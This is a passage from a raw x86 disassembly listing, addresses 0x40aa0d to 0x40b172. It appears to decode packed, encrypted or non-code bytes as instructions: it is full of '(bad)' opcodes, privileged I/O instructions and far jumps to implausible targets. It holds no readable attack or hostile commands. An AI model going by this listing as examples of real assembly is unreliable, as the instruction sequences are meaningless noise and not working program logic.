  40aa0d:	es leave 
  40aa0f:	dec    ecx
  40aa10:	and    al,0xd
  40aa12:	loop   0x40a9ae
  40aa14:	xchg   esi,eax
  40aa15:	repnz stos BYTE PTR es:[edi],al
  40aa17:	sub    eax,0x202e2f1e
  40aa1c:	dec    esi
  40aa1d:	push   edi
  40aa1e:	retf   0x8fb1
  40aa21:	sahf   
  40aa22:	pop    esi
  40aa23:	dec    ebp
  40aa24:	mov    ebx,DWORD PTR ds:0xd6faad61
  40aa2a:	adc    DWORD PTR [edi-0x64],ebx
  40aa2d:	hlt    
  40aa2e:	loope  0x40aa23
  40aa30:	inc    ebx
  40aa31:	out    dx,al
  40aa32:	mov    ecx,0x6d95f2a2
  40aa37:	js     0x40aa25
  40aa39:	ret    
  40aa3a:	mov    ebp,0x6d0dc668
  40aa3f:	adc    DWORD PTR [ebx],ebp
  40aa41:	fwait
  40aa42:	retf   
  40aa43:	adc    eax,0xbb6a43bf
  40aa48:	adc    eax,esp
  40aa4a:	iret   
  40aa4b:	or     eax,0xd5f63e89
  40aa50:	mov    ch,0x98
  40aa52:	or     eax,0x69b7d4ca
  40aa57:	mov    DWORD PTR [ecx],edx
  40aa59:	ins    BYTE PTR es:[edi],dx
  40aa5a:	dec    ecx
  40aa5b:	nop    esp
  40aa5e:	mov    dl,0x76
  40aa60:	out    0x6,al
  40aa62:	out    0x65,eax
  40aa64:	add    edi,0x60
  40aa67:	fdiv   DWORD PTR [edi-0x3d178cc1]
  40aa6d:	loope  0x40aa8f
  40aa6f:	or     eax,0xd07b6c83
  40aa74:	sbb    eax,0x9d3e66c2
  40aa79:	pop    esi
  40aa7a:	addr16 call 0x24de:0xb371d23e
  40aa82:	fadd   st(1),st
  40aa84:	pop    es
  40aa85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa86:	adc    al,0x21
  40aa88:	pop    eax
  40aa89:	xor    BYTE PTR [edi+ebp*1],ch
  40aa8c:	(bad)  
  40aa8d:	jne    0x40aa62
  40aa8f:	jno    0x40ab05
  40aa91:	push   ecx
  40aa92:	popf   
  40aa93:	sbb    esp,DWORD PTR [eax]
  40aa95:	ins    DWORD PTR es:[edi],dx
  40aa96:	scas   eax,DWORD PTR es:[edi]
  40aa97:	mov    eax,0xe9780490
  40aa9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa9d:	jbe    0x40aa89
  40aa9f:	mov    cl,0x9d
  40aaa1:	cmp    bh,BYTE PTR [ebx+ecx*8-0x119802b1]
  40aaa8:	loopne 0x40aa75
  40aaaa:	pop    ss
  40aaab:	mov    edi,0x17de89ad
  40aab0:	inc    esp
  40aab1:	rol    BYTE PTR [ebp+0x0],0x35
  40aab5:	jo     0x40aae5
  40aab7:	dec    eax
  40aab8:	pop    eax
  40aab9:	adc    BYTE PTR [edi],0xc2
  40aabc:	scas   al,BYTE PTR es:[edi]
  40aabd:	cmp    eax,0x36d7b9d6
  40aac2:	test   eax,0x88f63909
  40aac7:	sub    BYTE PTR [edx+eiz*4],al
  40aaca:	retf   
  40aacb:	ret    
  40aacc:	mov    ds:0xb8d54457,al
  40aad1:	push   esi
  40aad2:	popa   
  40aad3:	sti    
  40aad4:	jp     0x40ab51
  40aad6:	fstp   QWORD PTR [ecx-0x1a]
  40aad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aada:	inc    DWORD PTR [edx]
  40aadc:	test   dh,ah
  40aade:	mov    al,ds:0x95c0e8b6
  40aae3:	lods   eax,DWORD PTR ds:[esi]
  40aae4:	cmp    BYTE PTR [edi-0x7f],bh
  40aae7:	mov    ebp,0x2bb3bbc3
  40aaec:	mov    al,0x95
  40aaee:	xlat   BYTE PTR ds:[ebx]
  40aaef:	mov    dl,0x68
  40aaf1:	or     eax,0x1aa846f4
  40aaf6:	fldenv [esi]
  40aaf8:	nop
  40aaf9:	enter  0xda6b,0x56
  40aafd:	jo     0x40aaa0
  40aaff:	jb     0x40ab45
  40ab01:	or     BYTE PTR [ebp+0x66],0xd2
  40ab05:	jmp    0xc81d:0x28dd24d2
  40ab0c:	push   ss
  40ab0d:	push   ebp
  40ab0e:	and    ch,BYTE PTR [ecx+0x3e9c7124]
  40ab14:	dec    esi
  40ab15:	mov    WORD PTR [eax-0x79],ds
  40ab18:	or     BYTE PTR [ecx],bl
  40ab1a:	push   ebp
  40ab1b:	inc    edi
  40ab1c:	icebp  
  40ab1d:	loop   0x40aabb
  40ab1f:	push   edi
  40ab20:	inc    ebp
  40ab21:	xor    DWORD PTR [eax],0x15
  40ab24:	ins    BYTE PTR es:[edi],dx
  40ab25:	push   ds
  40ab26:	inc    ebp
  40ab27:	test   DWORD PTR [eax],0xe223ec11
  40ab2d:	push   ds
  40ab2e:	dec    ecx
  40ab2f:	pushf  
  40ab30:	push   esi
  40ab31:	minps  xmm4,XMMWORD PTR [edx+ebp*4-0x6b7cd77]
  40ab39:	ins    BYTE PTR es:[edi],dx
  40ab3a:	cmp    esp,edi
  40ab3c:	jg     0x40ab15
  40ab3e:	push   0xffffffb3
  40ab40:	mov    al,0xd5
  40ab42:	adc    al,0xf6
  40ab44:	jmp    0xa03ac606
  40ab49:	mov    ebx,0xb40a4e64
  40ab4e:	fcmovnu st,st(3)
  40ab50:	jmp    0xb3ee:0x78a8f1ec
  40ab57:	outs   dx,DWORD PTR ds:[esi]
  40ab58:	repz out dx,al
  40ab5a:	fisubr DWORD PTR [esi]
  40ab5c:	mov    BYTE PTR [eax+0x21],ch
  40ab5f:	ficomp DWORD PTR [edi]
  40ab61:	jge    0x40ab82
  40ab63:	pop    ds
  40ab64:	adc    esi,ebx
  40ab66:	cmp    eax,0xb75b9030
  40ab6b:	push   ebx
  40ab6c:	push   0x72763d59
  40ab71:	pop    esp
  40ab72:	and    eax,0xb5f981b4
  40ab77:	aad    0x93
  40ab79:	ja     0x40ab7c
  40ab7b:	jg     0x40abe9
  40ab7d:	and    dh,BYTE PTR [ebx]
  40ab7f:	(bad)  
  40ab80:	inc    BYTE PTR [ebx+0x3512de2f]
  40ab86:	sbb    ch,ah
  40ab88:	outs   dx,DWORD PTR ds:[esi]
  40ab89:	ins    DWORD PTR es:[edi],dx
  40ab8a:	cdq    
  40ab8b:	push   esp
  40ab8c:	icebp  
  40ab8d:	in     al,0xc0
  40ab8f:	inc    esi
  40ab90:	stc    
  40ab91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab92:	push   esi
  40ab93:	xor    BYTE PTR ds:0x178e8764,dl
  40ab99:	addr16 xor al,0x65
  40ab9c:	vpaddusw ymm3,ymm3,ymm1
  40aba0:	cdq    
  40aba1:	aas    
  40aba2:	addr16 daa 
  40aba4:	or     BYTE PTR [esp+ebx*2+0x1de34df5],al
  40abab:	mov    edi,0xb43803ae
  40abb0:	xchg   esi,eax
  40abb1:	jp     0x40abed
  40abb3:	sbb    al,0xb1
  40abb5:	sbb    esi,ebx
  40abb7:	push   edi
  40abb8:	jle    0x40ab6e
  40abba:	xchg   esp,eax
  40abbb:	loope  0x40aba7
  40abbd:	int3   
  40abbe:	repnz lea ebp,[edi+esi*8+0x6d]
  40abc3:	push   esi
  40abc4:	hlt    
  40abc5:	push   ecx
  40abc6:	cmp    eax,0x2badbe10
  40abcb:	and    al,0xf4
  40abcd:	xchg   edi,eax
  40abce:	test   eax,0x1b498724
  40abd3:	mov    ds:0x17bd0b3,al
  40abd8:	jmp    0x40ab7d
  40abda:	adc    dl,0x9e
  40abdd:	arpl   WORD PTR [eax],sp
  40abdf:	sub    DWORD PTR [ebp+0x2632d36b],ebx
  40abe5:	ja     0x40ac3f
  40abe7:	stos   BYTE PTR es:[edi],al
  40abe8:	popf   
  40abe9:	push   edx
  40abea:	aam    0x41
  40abec:	lock mov ah,0x14
  40abef:	aaa    
  40abf0:	(bad)  
  40abf1:	ss jo  0x40ac1c
  40abf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abf5:	cmp    esp,DWORD PTR [eax-0x47412265]
  40abfb:	mov    ds:0xa646886a,eax
  40ac00:	sbb    al,0xdf
  40ac02:	xor    eax,0xbb83a014
  40ac07:	pop    esp
  40ac08:	pushf  
  40ac09:	sbb    al,0x5d
  40ac0b:	out    0x81,al
  40ac0d:	pushf  
  40ac0e:	pop    ecx
  40ac0f:	pop    es
  40ac10:	and    esp,DWORD PTR [edx]
  40ac12:	add    DWORD PTR [edi],esi
  40ac14:	stc    
  40ac15:	stc    
  40ac16:	inc    ecx
  40ac17:	lods   al,BYTE PTR ds:[esi]
  40ac18:	xchg   ebp,eax
  40ac19:	je     0x40abf9
  40ac1b:	(bad)  
  40ac1c:	jp     0x40abbe
  40ac1e:	nop
  40ac1f:	or     al,0xe9
  40ac21:	(bad)  
  40ac22:	jmp    0x40abbc
  40ac24:	outs   dx,DWORD PTR ds:[esi]
  40ac25:	adc    eax,0xfeaa2f4f
  40ac2a:	adc    bh,ch
  40ac2c:	dec    edi
  40ac2d:	out    0xc6,eax
  40ac2f:	icebp  
  40ac30:	out    0x10,eax
  40ac32:	ds stos BYTE PTR es:[edi],al
  40ac34:	adc    ecx,ecx
  40ac36:	xor    ebp,DWORD PTR [ecx-0x56e06482]
  40ac3c:	xchg   cl,dl
  40ac3e:	dec    eax
  40ac3f:	clc    
  40ac40:	mov    dl,0x7a
  40ac42:	sbb    BYTE PTR [edx],ah
  40ac44:	jmp    0xdd40394e
  40ac49:	sub    dh,ch
  40ac4b:	add    al,0x69
  40ac4d:	(bad)  
  40ac4e:	sbb    al,0x7b
  40ac50:	in     eax,dx
  40ac51:	sub    eax,0x4a2c84c1
  40ac56:	xor    bh,dh
  40ac58:	inc    ebx
  40ac59:	xor    eax,0xaf81c716
  40ac5e:	cmc    
  40ac5f:	cmp    al,0x4e
  40ac61:	xor    bl,BYTE PTR [esi-0x2c]
  40ac64:	pop    ss
  40ac65:	sti    
  40ac66:	mov    al,ds:0xd767d8c4
  40ac6b:	loop   0x40ac58
  40ac6d:	xchg   edi,eax
  40ac6e:	repz and BYTE PTR [ebx],cl
  40ac71:	inc    esi
  40ac72:	jle    0x40ac1c
  40ac74:	sbb    dh,dl
  40ac76:	cli    
  40ac77:	call   0x4aaa:0xb44ed59e
  40ac7e:	push   ebp
  40ac7f:	ins    DWORD PTR es:[edi],dx
  40ac80:	dec    edx
  40ac81:	test   DWORD PTR [edi+edi*1+0x11],esi
  40ac85:	outs   dx,DWORD PTR ds:[esi]
  40ac86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac87:	dec    edx
  40ac88:	fidiv  WORD PTR [edi-0x3]
  40ac8b:	cmp    eax,0x62baafcc
  40ac90:	bound  edx,QWORD PTR [ebx+0x47]
  40ac93:	fs fs call 0x7cd7958d
  40ac9a:	loope  0x40acea
  40ac9c:	and    ebp,DWORD PTR [edi+0x9]
  40ac9f:	push   cs
  40aca0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40aca2:	or     bh,al
  40aca4:	or     al,0x2b
  40aca6:	xor    edx,DWORD PTR [eax+ebp*1]
  40aca9:	sub    al,0xa5
  40acab:	(bad)  
  40acac:	xchg   ecx,eax
  40acad:	and    al,0xa2
  40acaf:	popa   
  40acb0:	mov    dh,0x70
  40acb2:	cwde   
  40acb3:	inc    edi
  40acb4:	std    
  40acb5:	mov    cl,0xf3
  40acb7:	xchg   edx,eax
  40acb8:	jo     0x40ac51
  40acba:	mov    bl,0x61
  40acbc:	xchg   edx,eax
  40acbd:	inc    eax
  40acbe:	ret    0x9905
  40acc1:	jbe    0x40acaf
  40acc3:	iret   
  40acc4:	mov    edi,0x86dac6f4
  40acc9:	mov    bl,0xd6
  40accb:	gs inc ebp
  40accd:	leave  
  40acce:	fdiv   DWORD PTR [edx+0x10134460]
  40acd4:	fiadd  DWORD PTR [ebp+eiz*1-0x10]
  40acd8:	mov    BYTE PTR [ecx+0xa64e863],ch
  40acde:	ds sub ecx,ebp
  40ace1:	ret    0x9f5c
  40ace4:	outs   dx,BYTE PTR ds:[esi]
  40ace5:	inc    ebp
  40ace6:	mov    edx,0x864743e7
  40aceb:	clc    
  40acec:	bound  edx,QWORD PTR [ebp+0x18]
  40acef:	jecxz  0x40acd8
  40acf1:	lods   eax,DWORD PTR ds:[esi]
  40acf2:	outs   dx,BYTE PTR ds:[esi]
  40acf3:	mov    al,BYTE PTR [ecx]
  40acf5:	fs sub edi,esp
  40acf8:	repz add BYTE PTR [edi-0x4b445cd8],ch
  40acff:	ficomp WORD PTR [ecx-0x7512efa7]
  40ad05:	sub    DWORD PTR [ecx+eiz*2+0x1cc8f8f0],ebx
  40ad0c:	inc    ebp
  40ad0d:	mov    WORD PTR [ebx+0x78],gs
  40ad10:	and    al,0x9d
  40ad12:	sub    ch,BYTE PTR [edi+0x61c3ddd6]
  40ad18:	adc    al,0xfe
  40ad1a:	cwde   
  40ad1b:	std    
  40ad1c:	dec    eax
  40ad1d:	repnz adc ah,BYTE PTR [esi+0x5e119ae3]
  40ad24:	dec    BYTE PTR [ecx+0x67]
  40ad27:	js     0x40ad7b
  40ad29:	test   BYTE PTR [edx-0x5466af39],bl
  40ad2f:	pop    ds
  40ad30:	sbb    esi,DWORD PTR [ecx-0x70]
  40ad33:	imul   esp,DWORD PTR [edx+0xaa1d6bf],0xbf70ccf
  40ad3d:	ret    
  40ad3e:	std    
  40ad3f:	jo     0x40ada2
  40ad41:	repz ror edi,0x9c
  40ad45:	and    al,0x6c
  40ad47:	arpl   WORD PTR ds:0x7faf44c4,ax
  40ad4d:	xor    DWORD PTR [edx+0x5c],ebp
  40ad50:	adc    DWORD PTR [ebx],0xffffff87
  40ad53:	inc    esi
  40ad54:	push   0xb6a0af8e
  40ad59:	add    eax,0xc1a91462
  40ad5e:	sbb    al,0x7f
  40ad60:	aaa    
  40ad61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad62:	sar    al,cl
  40ad64:	adc    bh,al
  40ad66:	pop    ds
  40ad67:	jbe    0x40ad7a
  40ad69:	addr16 jmp 0x6274:0x148057e3
  40ad71:	in     eax,0x57
  40ad73:	pop    ebp
  40ad74:	mov    edi,0x199698ae
  40ad79:	(bad)  
  40ad7a:	inc    eax
  40ad7b:	test   eax,0xa1e8465c
  40ad80:	and    ebx,DWORD PTR ds:0x1c9de1d6
  40ad86:	or     al,dl
  40ad88:	sbb    ecx,DWORD PTR [ebp+0x37]
  40ad8b:	xor    ch,BYTE PTR ds:0xf20bae31
  40ad91:	imul   ecx,ecx,0x66e444e5
  40ad97:	add    ebx,DWORD PTR [ecx-0x6b349681]
  40ad9d:	cwde   
  40ad9e:	or     DWORD PTR [esi+ebp*8+0x3c25e3f5],edx
  40ada5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ada6:	xchg   DWORD PTR [esi+eiz*4+0x46],ebx
  40adaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adab:	and    al,0xca
  40adad:	cmp    DWORD PTR [edi+ecx*4],ebx
  40adb0:	(bad)  
  40adb2:	mov    eax,0xac92d66e
  40adb7:	rcr    BYTE PTR [eax],cl
  40adb9:	ror    DWORD PTR [edx+0x3daf3ca],0x3b
  40adc0:	inc    ecx
  40adc1:	and    al,0x21
  40adc3:	fimul  DWORD PTR [eax+0x21da880b]
  40adc9:	shr    DWORD PTR [eax],cl
  40adcb:	imul   ecx,DWORD PTR [edx+0x1fd5c1e4],0x4e4a7682
  40add5:	inc    edx
  40add6:	lock or al,0x6c
  40add9:	mov    ds:0xacb8a9ff,eax
  40adde:	jnp    0x40ada1
  40ade0:	je     0x40ae59
  40ade2:	mov    ds:0xb8f6c91e,eax
  40ade7:	mov    eax,ds:0xe28541b4
  40adec:	jge    0x40adc9
  40adee:	jmp    0x4b2dea8
  40adf3:	arpl   WORD PTR [ebx-0x388c1543],bp
  40adf9:	jecxz  0x40ae5b
  40adfb:	sbb    DWORD PTR [eax],0x764479cb
  40ae01:	sub    al,0x57
  40ae03:	cmc    
  40ae04:	fdiv   DWORD PTR [edi+esi*1]
  40ae07:	iret   
  40ae08:	ss test eax,0xf829ff78
  40ae0e:	inc    eax
  40ae0f:	pop    eax
  40ae10:	jp     0x40ae43
  40ae12:	pop    ebp
  40ae13:	xchg   edx,eax
  40ae14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae16:	lds    eax,FWORD PTR ds:0x12fd9e21
  40ae1c:	mov    ds:0xde7389a4,eax
  40ae21:	jp     0x40ae7f
  40ae23:	jecxz  0x40ae0f
  40ae25:	add    ch,bl
  40ae27:	pop    edx
  40ae28:	and    ch,bh
  40ae2a:	inc    edi
  40ae2b:	ja     0x40ae73
  40ae2d:	and    al,0xa5
  40ae2f:	pop    edx
  40ae30:	hlt    
  40ae31:	pop    ebx
  40ae32:	sbb    ebx,DWORD PTR [edi-0x6]
  40ae35:	in     al,0xbe
  40ae37:	mov    dh,0x74
  40ae39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae3a:	bound  ebx,QWORD PTR [esi+0x6b]
  40ae3d:	inc    edi
  40ae3e:	pop    edx
  40ae3f:	adc    al,0xbe
  40ae41:	fisttp QWORD PTR [ebx]
  40ae43:	push   0x363a4b6
  40ae48:	ds push esp
  40ae4a:	fs adc al,0x95
  40ae4d:	fcomp  QWORD PTR [esi-0x1c40f390]
  40ae53:	test   BYTE PTR [edx],ch
  40ae55:	inc    ebp
  40ae56:	jae    0x40adee
  40ae58:	stc    
  40ae59:	lahf   
  40ae5a:	jmp    0x40aebc
  40ae5c:	push   edi
  40ae5d:	stos   BYTE PTR es:[edi],al
  40ae5e:	test   al,0x78
  40ae60:	push   esp
  40ae61:	imul   esp,DWORD PTR [ecx-0x2f],0x59bd533a
  40ae68:	fist   DWORD PTR [ebx+0x30]
  40ae6b:	std    
  40ae6c:	mov    ch,0x61
  40ae6e:	sbb    eax,0x3926ce18
  40ae73:	sub    BYTE PTR [di+0x4c],ch
  40ae77:	pop    edi
  40ae78:	inc    ebp
  40ae79:	pop    ebx
  40ae7a:	mov    ebp,gs
  40ae7c:	push   ss
  40ae7d:	xor    al,0x32
  40ae7f:	push   0xffffffe0
  40ae81:	ins    BYTE PTR es:[edi],dx
  40ae82:	lods   al,BYTE PTR ds:[esi]
  40ae83:	rcr    esp,1
  40ae85:	js     0x40ae96
  40ae87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae88:	jo     0x40ae77
  40ae8a:	and    al,dh
  40ae8c:	leave  
  40ae8d:	mov    ebx,0x2b65a4d1
  40ae92:	adc    al,0xad
  40ae94:	xchg   ebp,eax
  40ae95:	ficomp DWORD PTR [ebx+0x351e0e5e]
  40ae9b:	fcmovbe st,st(4)
  40ae9d:	jge    0x40aef5
  40ae9f:	or     ah,BYTE PTR [eax+0x21]
  40aea2:	fidiv  WORD PTR [eax]
  40aea4:	cmp    al,0x2b
  40aea6:	mov    al,ds:0xd5a70408
  40aeab:	out    dx,al
  40aeac:	test   al,0xa2
  40aeae:	test   DWORD PTR [eax-0x36],edx
  40aeb1:	pushf  
  40aeb2:	dec    edi
  40aeb3:	fsub   DWORD PTR es:[esi+0x7e7a76e3]
  40aeba:	push   esi
  40aebb:	cli    
  40aebc:	jo     0x40ae91
  40aebe:	jae    0x40af07
  40aec0:	das    
  40aec1:	scas   eax,DWORD PTR es:[edi]
  40aec2:	call   0x72c6b3a1
  40aec7:	dec    ebx
  40aec8:	ret    
  40aec9:	in     al,dx
  40aeca:	clc    
  40aecb:	sub    eax,0xcdd04a13
  40aed0:	out    0x5c,eax
  40aed2:	or     BYTE PTR [eax-0x544345ad],ah
  40aed8:	shl    DWORD PTR [edx-0x7e38f508],cl
  40aede:	repz inc eax
  40aee0:	std    
  40aee1:	mov    esp,?
  40aee3:	pusha  
  40aee4:	mov    al,ds:0xc2fabc3
  40aee9:	jbe    0x40ae7e
  40aeeb:	(bad)  
  40aeec:	or     BYTE PTR [edi+0x6],0x58
  40aef0:	pop    ss
  40aef1:	xchg   ebx,eax
  40aef2:	ss pop ds
  40aef4:	mov    ebp,0xa389330f
  40aef9:	inc    ecx
  40aefa:	jnp    0x40aeee
  40aefc:	dec    ecx
  40aefd:	repnz test dl,0x1f
  40af01:	hlt    
  40af02:	rol    BYTE PTR [edi+0x32],0x77
  40af06:	cs or  al,0x68
  40af09:	cli    
  40af0a:	outs   dx,BYTE PTR ds:[esi]
  40af0b:	mov    bl,BYTE PTR [eax]
  40af0d:	mov    al,ds:0xa64168b7
  40af12:	xlat   BYTE PTR ds:[ebx]
  40af13:	out    dx,al
  40af14:	xor    al,0xa2
  40af16:	daa    
  40af17:	jp     0x40aeaa
  40af19:	lea    esp,[ebp+0x1e12244]
  40af1f:	stc    
  40af20:	pusha  
  40af21:	lods   al,BYTE PTR ds:[esi]
  40af22:	inc    ecx
  40af23:	push   ecx
  40af24:	jne    0x40aeb0
  40af26:	jmp    0xa13:0xcad89398
  40af2d:	dec    esp
  40af2e:	xchg   ecx,eax
  40af2f:	mov    ebp,0x420990fe
  40af34:	xor    BYTE PTR [esi],dl
  40af36:	mov    dl,0x70
  40af38:	jns    0x40af46
  40af3a:	fst    DWORD PTR [ebx+ebp*8]
  40af3d:	push   ecx
  40af3e:	mov    bl,0x51
  40af40:	inc    esi
  40af41:	inc    esp
  40af42:	mov    ebx,esp
  40af44:	call   0xdf99eaa2
  40af49:	not    DWORD PTR [ebp-0x60]
  40af4c:	call   0x372e3b07
  40af51:	cs jge 0x40af25
  40af54:	mov    WORD PTR [eax-0x90fb564],ds
  40af5a:	shl    esi,0x5c
  40af5d:	cli    
  40af5e:	sbb    dh,BYTE PTR ds:[ebx]
  40af61:	mov    ah,0x3d
  40af63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af64:	adc    BYTE PTR [ecx+0x739ad69c],0xed
  40af6b:	xor    esp,DWORD PTR [esi+0x796cb41f]
  40af71:	int3   
  40af72:	arpl   WORD PTR [edi],dx
  40af74:	fs aam 0xb6
  40af77:	pop    edi
  40af78:	mov    bl,0xc3
  40af7a:	or     DWORD PTR [ecx],edi
  40af7c:	addr16 jmp 0x40af0e
  40af7f:	lods   eax,DWORD PTR ds:[esi]
  40af80:	or     al,0xff
  40af82:	add    DWORD PTR [esi-0x71],ecx
  40af85:	gs pop eax
  40af87:	shl    ah,0x2f
  40af8a:	lds    ebp,FWORD PTR [ebp+0x5aa5bf4d]
  40af90:	(bad)  
  40af91:	int    0x16
  40af93:	dec    edx
  40af94:	push   esp
  40af95:	imul   ecx,esi,0xffffff96
  40af98:	jo     0x40af90
  40af9a:	jmp    0x37f61d69
  40af9f:	mov    DWORD PTR [edx+0x7cacc65c],eax
  40afa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afa6:	dec    esp
  40afa7:	cmp    cl,bh
  40afa9:	clc    
  40afaa:	xor    al,0xf7
  40afac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afad:	out    0x90,al
  40afaf:	imul   eax,DWORD PTR [edi+0x5c],0x306190
  40afb6:	jmp    0x1a94a207
  40afbb:	es push edx
  40afbd:	es in  al,0x25
  40afc0:	mov    ch,0xdc
  40afc2:	retf   
  40afc3:	retf   0x5c4
  40afc6:	inc    DWORD PTR [ebx+0x8]
  40afc9:	call   0x40d:0x3fcf4ba6
  40afd0:	cmp    al,0x39
  40afd2:	addr16 dec edx
  40afd4:	pop    esi
  40afd5:	jbe    0x40b038
  40afd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afd8:	addr16 pop ecx
  40afda:	jae    0x40b046
  40afdc:	gs fcmovnu st,st(3)
  40afdf:	mov    dh,0xce
  40afe1:	xchg   edx,eax
  40afe2:	jns    0x40aff5
  40afe4:	pushf  
  40afe5:	and    edi,DWORD PTR [esi+0x53ed705c]
  40afeb:	test   bl,cl
  40afed:	mov    ebp,0x66a7e93d
  40aff2:	cmp    DWORD PTR [ecx],edx
  40aff4:	sub    ebp,ebp
  40aff6:	mov    ebp,0x63c1847f
  40affb:	cs pushf 
  40affd:	lahf   
  40affe:	add    BYTE PTR [ebx-0x56],dl
  40b001:	adc    eax,0x3f305937
  40b006:	mov    ecx,0x4bf12300
  40b00b:	and    BYTE PTR [edi+0x58],al
  40b00e:	jp     0x40b02e
  40b010:	rol    DWORD PTR [esi],1
  40b012:	test   DWORD PTR [eax-0x31ed8fd7],esp
  40b018:	jae    0x40afd1
  40b01a:	lods   al,BYTE PTR ds:[esi]
  40b01b:	data16 scas al,BYTE PTR es:[edi]
  40b01d:	popa   
  40b01e:	or     al,0x79
  40b020:	mov    ch,0x47
  40b022:	jle    0x40afe0
  40b024:	nop
  40b025:	cwde   
  40b026:	jns    0x40b065
  40b028:	sbb    bh,cl
  40b02a:	jge    0x40afb6
  40b02c:	(bad)  
  40b02d:	mov    cl,0x89
  40b02f:	ins    BYTE PTR es:[edi],dx
  40b030:	test   al,0x69
  40b032:	aaa    
  40b033:	dec    eax
  40b034:	cmp    eax,0xd0b271fc
  40b039:	cmp    dh,ch
  40b03b:	(bad)  
  40b03c:	adc    DWORD PTR [eax],eax
  40b03e:	cld    
  40b03f:	xor    DWORD PTR [esi-0x56946445],0x2a0e0aac
  40b049:	jmp    0x40b011
  40b04b:	(bad)  
  40b04c:	xchg   edx,eax
  40b04d:	jb     0x40b0a0
  40b04f:	push   eax
  40b050:	or     ebp,esp
  40b052:	imul   edx,ebp,0x8167a1af
  40b058:	xor    eax,0xd6383400
  40b05d:	jmp    0xf44:0xe9d34afb
  40b064:	stos   DWORD PTR es:[edi],eax
  40b065:	xchg   ebp,eax
  40b066:	mov    edx,0xaf79b06e
  40b06b:	stos   DWORD PTR es:[edi],eax
  40b06c:	cwde   
  40b06d:	jmp    0xe1895f3e
  40b072:	pop    ebx
  40b073:	pop    edx
  40b074:	cmp    eax,eax
  40b076:	sub    BYTE PTR [eax],0xbf
  40b079:	and    ah,BYTE PTR [eax]
  40b07b:	sub    eax,0x74d901f3
  40b080:	add    BYTE PTR [ecx+edx*8],0xd5
  40b084:	int3   
  40b085:	dec    edi
  40b086:	add    BYTE PTR [esi+0x230ac22d],dl
  40b08c:	mov    ds,WORD PTR [edi+0x39830fa0]
  40b092:	nop
  40b093:	xchg   BYTE PTR [eax],dh
  40b095:	dec    ebp
  40b096:	lahf   
  40b097:	in     eax,0x16
  40b099:	aam    0x87
  40b09b:	cmp    al,0xa3
  40b09d:	mov    dh,0x42
  40b09f:	bnd ret 0xc4c9
  40b0a3:	pushf  
  40b0a4:	mov    al,ah
  40b0a6:	push   esp
  40b0a7:	fld    DWORD PTR [edi-0xc6a066f]
  40b0ad:	ja     0x40b03f
  40b0af:	repnz cmp ah,BYTE PTR [eax+0x7c2f7fe0]
  40b0b6:	sub    BYTE PTR [edi-0x30985860],bh
  40b0bc:	pop    ecx
  40b0bd:	jle    0x40b0f2
  40b0bf:	dec    edi
  40b0c0:	je     0x40b06a
  40b0c2:	cmp    al,0xa9
  40b0c4:	jne    0x40b0a9
  40b0c6:	mov    cl,0xae
  40b0c8:	mov    WORD PTR [ebp+0x6b],ss
  40b0cb:	pop    eax
  40b0cc:	pusha  
  40b0cd:	sub    ah,ch
  40b0cf:	mov    cl,ch
  40b0d1:	lods   eax,DWORD PTR ds:[esi]
  40b0d2:	in     eax,0xfc
  40b0d4:	xchg   edi,ebp
  40b0d6:	rcl    bh,0x7d
  40b0d9:	xor    esi,edx
  40b0db:	retf   
  40b0dc:	xchg   edi,eax
  40b0dd:	idiv   BYTE PTR [ebx-0xb2d8485]
  40b0e3:	out    dx,eax
  40b0e4:	movd   DWORD PTR gs:[edx+0x773bf026],mm4
  40b0ec:	fiadd  WORD PTR [eax]
  40b0ee:	cli    
  40b0ef:	ins    BYTE PTR es:[edi],dx
  40b0f0:	rol    BYTE PTR [edx+eax*1+0x41e5386f],1
  40b0f7:	mov    gs,WORD PTR [ebx+0x68]
  40b0fa:	xchg   esp,eax
  40b0fb:	(bad)  
  40b0fd:	jbe    0x40b0ee
  40b0ff:	call   0x9f3fff48
  40b104:	pop    edi
  40b105:	mov    eax,ds:0x6d8c580
  40b10a:	call   FWORD PTR ds:0x62e1d950
  40b110:	fwait
  40b111:	cmp    DWORD PTR [ebp+0x77],edi
  40b114:	(bad)  
  40b115:	sbb    dl,BYTE PTR [ebx-0x74]
  40b118:	aam    0xc3
  40b11a:	mov    esp,0x7d0ce73c
  40b11f:	(bad)  
  40b120:	mov    ebx,edi
  40b122:	push   cs
  40b123:	in     eax,dx
  40b124:	popa   
  40b125:	jno    0x40b15f
  40b127:	pop    eax
  40b128:	push   esi
  40b129:	ins    DWORD PTR es:[edi],dx
  40b12a:	cmp    eax,0x5b613437
  40b12f:	stc    
  40b130:	dec    esi
  40b131:	and    ah,ch
  40b133:	aam    0xc4
  40b135:	mov    eax,eax
  40b137:	pop    edx
  40b138:	add    eax,0xbfbea17c
  40b13d:	retf   0x565e
  40b140:	add    esi,esp
  40b142:	and    bl,BYTE PTR [edx-0x764d6e8]
  40b148:	adc    edx,0xfffffff3
  40b14b:	icebp  
  40b14c:	mov    dh,0xe6
  40b14e:	jge    0x40b1c5
  40b150:	in     eax,dx
  40b151:	mov    ebp,DWORD PTR [ebx-0x7c]
  40b154:	jmp    0x385d5773
  40b159:	xor    ecx,esp
  40b15b:	ds addr16 sbb eax,0xfdca975e
  40b162:	cmp    BYTE PTR fs:[edx+0x23816093],0x3
  40b16a:	inc    ebx
  40b16b:	xchg   BYTE PTR [edx+0x17a88160],cl
  40b171:	pop    ebp
  40b172:	out    dx,eax
